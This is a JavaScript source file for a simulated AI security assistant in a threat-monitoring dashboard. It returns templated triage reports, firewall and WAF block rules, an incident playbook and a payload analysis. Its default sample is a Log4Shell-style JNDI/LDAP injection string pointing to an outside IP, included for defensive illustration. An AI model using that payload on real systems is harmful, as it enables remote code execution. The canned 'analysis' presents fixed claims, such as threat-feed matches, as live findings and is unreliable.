/**
 * AI Security Assistant (Copilot) Logic
 * Context-aware threat analyst, WAF/firewall rule synthesizer,
 * NIST/MITRE incident response playbook generator, and payload reverse engineer.
 */

class AISecurityAssistant {
    constructor() {
        this.chatHistory = [];
        this.selectedFlow = null;
        this.listeners = [];
    }

    setSelectedFlow(flow) {
        this.selectedFlow = flow;
    }

    processUserQuery(query) {
        const userMsg = { sender: "user", text: query };
        this.chatHistory.push(userMsg);
        this.notifyListeners();

        // Simulate AI thinking and response generation
        setTimeout(() => {
            const responseObj = this.generateResponse(query);
            this.chatHistory.push(responseObj);
            this.notifyListeners();
        }, 600);
    }

    generateResponse(query) {
        const qLower = query.toLowerCase();
        const flow = this.selectedFlow || (window.threatDetector.flowHistory.find(f => f.isAnomaly) || window.threatDetector.flowHistory[0]);

        if (qLower.includes("triage") || qLower.includes("analyze") || qLower.includes("deep threat")) {
            return this.generateTriageResponse(flow);
        } else if (qLower.includes("rule") || qLower.includes("mitigat") || qLower.includes("firewall") || qLower.includes("waf")) {
            return this.generateMitigationRules(flow);
        } else if (qLower.includes("playbook") || qLower.includes("incident") || qLower.includes("nist") || qLower.includes("mitre")) {
            return this.generateIncidentPlaybook(flow);
        } else if (qLower.includes("payload") || qLower.includes("entropy") || qLower.includes("reverse") || qLower.includes("decode")) {
            return this.generatePayloadAnalysis(flow);
        } else if (qLower.includes("gpu") || qLower.includes("cuda") || qLower.includes("performance")) {
            return {
                sender: "system",
                text: `⚡ **GPU Acceleration Status & Telemetry:**\n\n- **Device:** ${window.gpuEngine.device}\n- **Inference Latency:** ${window.gpuEngine.latencyMicrosec} µs per batch\n- **Pipeline Throughput:** ${window.gpuEngine.throughputGbps} Gbps\n- **Active ML Model:** ${window.gpuEngine.activeModel}\n- **CUDA VRAM:** ${window.gpuEngine.vramUsed} MB / ${window.gpuEngine.vramTotal} MB\n\n*All pre-processing matrix feature engineering is computed parallelly on GPU Tensor Cores via CuPy/PyTorch JIT kernels.*`
            };
        } else {
            return {
                sender: "system",
                text: `🤖 **AI Security Assistant Analysis:**\n\nI have evaluated your request against current SOC telemetry. Based on recent traffic logs (${window.threatDetector.anomalyCount} anomalies detected):\n\n- Primary Threat Vector: **${flow ? flow.threatType : "Volumetric Anomaly"}**\n- Source IP: \`${flow ? flow.srcIP : "185.220.101.5"}\` -> Target: \`${flow ? flow.dstIP : "192.168.1.105"}:${flow ? flow.dstPort : 443}\`\n- Anomaly Confidence Score: **${flow ? (flow.anomalyScore * 100).toFixed(1) + "%" : "94.2%"}**\n\nYou can click quick actions above to generate WAF rules, incident playbooks, or reverse engineer payload bytes.`
            };
        }
    }

    generateTriageResponse(flow) {
        if (!flow) {
            return { sender: "system", text: "⚠️ No packet flow selected for triage. Inject an attack or select a row from the Threat Monitor." };
        }

        return {
            sender: "system",
            text: `🔍 **Deep Threat Triage Report [${flow.id}]**\n\n- **Threat Signature:** ${flow.threatType}\n- **Severity Level:** \`${flow.severity.toUpperCase()}\` (Confidence: ${(flow.anomalyScore * 100).toFixed(1)}%)\n- **Vector Path:** \`${flow.srcIP}\` ➔ \`${flow.dstIP}:${flow.dstPort}\` (${flow.protocol})\n- **Shannon Entropy:** \`${flow.entropy}\` (High randomness indicative of binary payload / encryption)\n- **TCP Flags:** \`${flow.tcpFlags}\` | Packet Rate: \`${flow.packetCount} pkts\`\n\n**Root Cause Diagnosis:**\nThe GPU PyTorch model detected abnormal packet distribution combined with elevated entropy. Origin IP \`${flow.srcIP}\` matches known botnet/C2 threat intelligence feeds.`
        };
    }

    generateMitigationRules(flow) {
        const srcIP = flow ? flow.srcIP : "185.220.101.5";
        const dstPort = flow ? flow.dstPort : 80;
        const threatName = flow ? flow.threatType : "Volumetric Exploit";

        const codeSnippet = `# 1. Suricata Intrusion Prevention Rule
drop tcp ${srcIP} any -> $HOME_NET ${dstPort} (msg:"GPU-NIDS Block ${threatName}"; sid:1000941; rev:1;)

# 2. Linux iptables Firewall Drop
iptables -A INPUT -s ${srcIP} -p tcp --dport ${dstPort} -j DROP

# 3. Cloudflare WAF JSON Expression
(ip.src eq "${srcIP}" and http.request.uri.path contains "ExploitPayload") -> BLOCK

# 4. AWS Security Group CLI Isolation
aws ec2 revoke-security-group-ingress --group-id sg-082491a --protocol tcp --port ${dstPort} --cidr ${srcIP}/32`;

        return {
            sender: "system",
            text: `🛡️ **Automated Mitigation Rules Synthesized:**\n\nGenerated zero-trust firewall & WAF signatures to contain \`${threatName}\` from \`${srcIP}\`:`,
            code: codeSnippet
        };
    }

    generateIncidentPlaybook(flow) {
        const threatName = flow ? flow.threatType : "Ransomware Exfiltration Wave";
        const srcIP = flow ? flow.srcIP : "185.220.101.5";
        const dstIP = flow ? flow.dstIP : "192.168.1.105";

        const playbookText = `📜 **NIST SP 800-61 / MITRE ATT&CK Incident Response Playbook**
*Target Threat:* **${threatName}** (T1071 - Application Layer Protocol)

---

### Step 1: Immediate Containment (T+0m to T+5m)
1. **Network Isolation:** Execute iptables / Security Group rule to drop incoming traffic from \`${srcIP}\`.
2. **Session Termination:** Kill active TCP socket connections to target host \`${dstIP}\`.

### Step 2: Investigation & Eradication (T+5m to T+30m)
1. **Memory Dump:** Capture RAM image on host \`${dstIP}\` to analyze memory-resident payloads.
2. **C2 Traffic Audit:** Scan internal DNS logs for auxiliary domain queries generated around timestamp \`${flow ? flow.timestamp : "Current"}\`.
3. **Artifact Removal:** Delete persistence scripts located in \`/tmp/\` or Windows Registry \`RunOnce\`.

### Step 3: Recovery & Lessons Learned (T+30m+)
1. **Snapshot Restore:** Restore system partition from immutably signed backup if files were encrypted.
2. **Signature Update:** Push generated Suricata rule (SID: 1000941) to edge firewall cluster.`;

        return {
            sender: "system",
            text: playbookText
        };
    }

    generatePayloadAnalysis(flow) {
        const payload = flow ? flow.payloadSnippet : "${jndi:ldap://185.220.101.5:1389/ExploitPayload}";
        const entropy = flow ? flow.entropy : 6.42;

        const codeSnippet = `Payload Snippet: "${payload}"
Entropy Score  : ${entropy} / 8.00 (High Payload Density)

Hex Dump Analysis:
00000000  24 7b 6a 6e 64 69 3a 6c  64 61 70 3a 2f 2f 31 38  |${payload.substring(0, 16)}|
00000010  35 2e 32 32 30 2e 31 30  31 2e 35 3a 31 33 38 39  |${payload.substring(16, 32)}|

Decoded Strings & IOC Extraction:
[!] Detected Obfuscated JNDI/LDAP Remote Class Loading Pattern
[!] Decoded Target C2 IP : 185.220.101.5
[!] Target Exploit Port : 1389 (LDAP RCE Listener)`;

        return {
            sender: "system",
            text: `🧪 **Payload Reverse Engineering & Shannon Entropy Breakdown:**\n\nInspected binary stream for raw packet payload:`,
            code: codeSnippet
        };
    }

    subscribe(callback) {
        this.listeners.push(callback);
    }

    notifyListeners() {
        this.listeners.forEach(fn => fn(this.chatHistory));
    }
}

window.aiAssistant = new AISecurityAssistant();
